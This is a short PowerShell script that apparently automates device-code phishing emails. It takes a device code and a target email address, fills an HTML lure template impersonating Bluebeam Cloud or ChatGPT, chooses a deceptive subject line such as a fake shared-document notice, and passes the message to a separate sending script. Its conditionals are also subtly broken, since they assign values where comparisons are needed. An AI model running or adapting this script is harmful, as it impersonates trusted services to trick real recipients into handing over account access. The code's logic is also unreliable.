[CmdletBinding()]
param(
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$code,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$subject,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$firstUser,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$template

)

if(!($code)){ $code = Read-Host "Enter Device code from PhirstPhish step" }
if(!($firstUser)){ $firstUser = Read-Host "Enter target email address"}


# Parameters match filename in templates, if we specify a template, find it's twin, else, bluebeam
if($template) { $template = ".\Templates\$template"}
else
{ $template = ".\Templates\bluebeam.htm"}

.\Replace.ps1 -code $code -template $template



$messageContent2 = Get-Content $template -Raw

if($template = "bluebeam"){
$subjects = @(
    "A Bluebeam Cloud user has shared 'Big City Project: Key Details and Timeline' with you.",
    "A Bluebeam Cloud user has shared 'Invitation: Steakholder Meeting on Downtown Development Plans. B.Y.O.Beef' with you.",
    "A Bluebeam Cloud user has shared 'Progress Update: Where are the gay robots??' with you.",
    "A Bluebeam Cloud user has shared 'Performance Improvement Plan and General Guidelines.' with you."
    )
}

if($template = "chatgpt"){
    $subjects = @(
    "ChatGPT wants you back."
    )
}


if($template = "blonde" || "fondo"){
    $subjects = @(
    "The Girls of Heavy Industry 2024."
    )
}



if(!($subject)){ $subject = Get-Random -InputObject $subjects} 
.\Final.ps1 -targetUser $firstUser -messageContent $messageContent2 -subject $subject